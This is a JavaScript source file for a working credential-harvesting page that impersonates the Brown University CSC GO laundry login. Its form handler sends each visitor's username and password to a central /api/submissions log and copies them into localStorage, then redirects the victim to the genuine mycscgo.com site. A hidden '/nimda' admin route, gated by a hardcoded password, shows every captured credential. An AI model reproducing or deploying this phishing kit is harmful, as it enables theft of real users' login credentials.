// csgoJS.js — central log via /api/submissions (Vercel Blob), localStorage fallback

const STORAGE_KEY = 'brown_creds_log';
const API_URL = '/api/submissions';
const POST_LOGIN_REDIRECT = 'https://mycscgo.com/laundry';
const ADMIN_PASSWORD = 'qwerqwer12341234';
const ADMIN_SESSION_KEY = 'nimda_authenticated';

document.addEventListener('DOMContentLoaded', function() {
    if (isNimdaRoute()) {
        initNimdaPage();
    } else {
        setupLoginForm();
        setupSideMenu();
    }
});

function isNimdaRoute() {
    const path = window.location.pathname;
    return path.includes('/nimda') || path === '/nimda';
}

function initNimdaPage() {
    document.body.classList.add('nimda-route');

    const gate = document.getElementById('admin-gate');
    const credsPage = document.getElementById('creds-page');

    if (credsPage) credsPage.style.display = 'none';

    if (sessionStorage.getItem(ADMIN_SESSION_KEY) === '1') {
        if (gate) gate.classList.remove('visible');
        showCredsPage();
        return;
    }

    if (gate) gate.classList.add('visible');
    setupAdminGate();
}

function setupAdminGate() {
    const form = document.getElementById('admin-gate-form');
    if (!form) return;

    form.addEventListener('submit', function(e) {
        e.preventDefault();

        const input = document.getElementById('admin-password');
        const errorEl = document.getElementById('admin-gate-error');
        const gate = document.getElementById('admin-gate');
        const password = input ? input.value : '';

        if (password !== ADMIN_PASSWORD) {
            if (errorEl) errorEl.classList.add('visible');
            if (input) input.value = '';
            return;
        }

        sessionStorage.setItem(ADMIN_SESSION_KEY, '1');
        if (errorEl) errorEl.classList.remove('visible');
        if (gate) gate.classList.remove('visible');
        showCredsPage();
    });
}

function setupSideMenu() {
    const menu = document.getElementById('side-menu');
    const openBtn = document.getElementById('menu-open');
    const closeBtn = document.getElementById('menu-close');
    const helpToggle = document.getElementById('help-toggle');
    const helpSection = document.getElementById('side-menu-help');

    if (!menu || !openBtn || !closeBtn) return;

    openBtn.addEventListener('click', openSideMenu);
    closeBtn.addEventListener('click', closeSideMenu);

    if (helpToggle && helpSection) {
        helpToggle.addEventListener('click', function() {
            helpSection.classList.toggle('open');
        });
    }

    document.querySelectorAll('.side-menu-item').forEach(function(item) {
        item.addEventListener('click', function() {
            window.location.href = '/';
        });
    });
}

function openSideMenu() {
    const menu = document.getElementById('side-menu');
    if (!menu) return;
    menu.classList.add('open');
    document.body.style.overflow = 'hidden';
}

function closeSideMenu() {
    const menu = document.getElementById('side-menu');
    if (!menu) return;
    menu.classList.remove('open');
    document.body.style.overflow = '';
}

function getLocalSubmissions() {
    try {
        const raw = localStorage.getItem(STORAGE_KEY);
        return raw ? JSON.parse(raw) : [];
    } catch (e) {
        console.error('Failed to read local submissions:', e);
        return [];
    }
}

function saveLocalSubmission(entry) {
    const log = getLocalSubmissions();
    log.unshift(entry);
    localStorage.setItem(STORAGE_KEY, JSON.stringify(log));
    localStorage.setItem('brown_creds', JSON.stringify(entry));
    localStorage.setItem('csc_username', entry.username);
    localStorage.setItem('csc_password', entry.password);
}

async function fetchSubmissions() {
    const response = await fetch(API_URL);
    if (!response.ok) throw new Error('Failed to load submissions');
    const data = await response.json();
    return { submissions: data.submissions || [], source: data.source || 'blob' };
}

async function postSubmission(username, password) {
    const response = await fetch(API_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username, password }),
    });

    if (!response.ok) {
        const err = await response.json().catch(() => ({}));
        throw new Error(err.error || 'Failed to save submission');
    }

    return response.json();
}

async function clearRemoteSubmissions() {
    const response = await fetch(API_URL, { method: 'DELETE' });
    if (!response.ok) throw new Error('Failed to clear remote log');
}

function setupLoginForm() {
    const loginForm = document.getElementById('auth-form');
    if (!loginForm) return;

    loginForm.addEventListener('submit', async function(e) {
        e.preventDefault();

        const username = document.getElementById('username').value.trim();
        const password = document.getElementById('password').value;
        const submitBtn = loginForm.querySelector('button[type="submit"]');

        if (!username || !password) {
            alert('Please enter both username and password');
            return;
        }

        if (submitBtn) {
            submitBtn.disabled = true;
            submitBtn.textContent = 'Saving...';
        }

        const entry = {
            username,
            password,
            timestamp: new Date().toISOString(),
            source: 'Brown University CSC GO',
        };

        try {
            await postSubmission(username, password);
            saveLocalSubmission(entry);
        } catch (error) {
            console.warn('API save failed, using local fallback:', error);
            saveLocalSubmission(entry);
        } finally {
            if (submitBtn) {
                submitBtn.disabled = false;
                submitBtn.textContent = 'Continue';
            }
        }

        showSuccessModal();
    });
}

function showSuccessModal() {
    const modal = document.getElementById('success-modal');
    if (!modal) return;

    modal.style.display = 'flex';

    setTimeout(() => {
        window.location.href = POST_LOGIN_REDIRECT;
    }, 2000);
}

function closeModal() {
    const modal = document.getElementById('success-modal');
    if (modal) modal.style.display = 'none';
    window.location.href = POST_LOGIN_REDIRECT;
}

function formatTime(iso) {
    try {
        return new Date(iso).toLocaleString();
    } catch (e) {
        return iso || 'N/A';
    }
}

function escapeHtml(text) {
    const div = document.createElement('div');
    div.textContent = text ?? '';
    return div.innerHTML;
}

function renderSubmissions(log, storageLabel) {
    const countEl = document.getElementById('submission-count');
    const listEl = document.getElementById('submission-list');
    const emptyEl = document.getElementById('empty-state');
    const sourceEl = document.getElementById('storage-source');

    if (sourceEl) sourceEl.textContent = storageLabel;
    if (countEl) countEl.textContent = String(log.length);
    if (!listEl) return;

    if (log.length === 0) {
        listEl.innerHTML = '';
        if (emptyEl) emptyEl.style.display = 'block';
        return;
    }

    if (emptyEl) emptyEl.style.display = 'none';

    listEl.innerHTML = log.map((entry, i) => `
        <div class="data-display submission-card">
            <strong>#${log.length - i}</strong>
            <span class="submission-time">${formatTime(entry.timestamp)}</span>
            <hr>
            <strong>Username:</strong> ${escapeHtml(entry.username)}<br><br>
            <strong>Password:</strong> ${escapeHtml(entry.password)}<br><br>
            <small style="color: #666;">Source: ${escapeHtml(entry.source || 'Unknown')}</small>
        </div>
    `).join('');
}

async function showCredsPage() {
    if (isNimdaRoute() && sessionStorage.getItem(ADMIN_SESSION_KEY) !== '1') {
        return;
    }

    const appView = document.getElementById('app-view');
    const credsPage = document.getElementById('creds-page');
    const gate = document.getElementById('admin-gate');

    if (appView) appView.style.display = 'none';
    if (gate) gate.classList.remove('visible');
    if (credsPage) credsPage.style.display = 'block';

    renderSubmissions([], 'Loading...');

    try {
        const { submissions } = await fetchSubmissions();
        renderSubmissions(submissions, 'Central log (all visitors)');
    } catch (error) {
        console.warn('API load failed, using local fallback:', error);
        renderSubmissions(getLocalSubmissions(), 'Local browser only (API unavailable)');
    }
}

async function clearAllSubmissions() {
    if (!confirm('Delete all saved submissions?')) return;

    try {
        await clearRemoteSubmissions();
    } catch (error) {
        console.warn('Remote clear failed:', error);
    }

    localStorage.removeItem(STORAGE_KEY);
    localStorage.removeItem('brown_creds');
    localStorage.removeItem('csc_username');
    localStorage.removeItem('csc_password');

    await showCredsPage();
}

window.closeModal = closeModal;
window.clearAllSubmissions = clearAllSubmissions;
